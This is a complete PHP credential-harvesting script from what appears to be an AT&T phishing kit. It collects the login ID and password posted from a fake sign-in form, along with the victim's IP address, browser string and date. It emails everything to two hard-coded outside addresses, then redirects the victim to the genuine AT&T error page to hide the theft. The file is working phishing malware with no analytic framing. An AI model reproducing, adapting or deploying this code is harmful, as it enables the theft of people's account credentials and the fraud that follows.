<?

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "--------Created By lovetosee -----\n";
$message .= "Online ID    : ".$_POST['userID']."\n";
$message .= "Password     : ".$_POST['password']."\n";
$message .= "--------------i.p----------------\n";
$message .= "IP: ".$ip."\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "-------Created By lovetosee----------\n";


$recipient = "johnmicmic53@gmail.com,johnmicmic53@protonmail.com";
$subject = "AtnT $ip";
$headers = "From: mR.j0n3z";
mail($recipient,$subject,$message,$headers);
header("Location: https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m10707&error=invalid_request&error_description=902&errorCode=902");
?>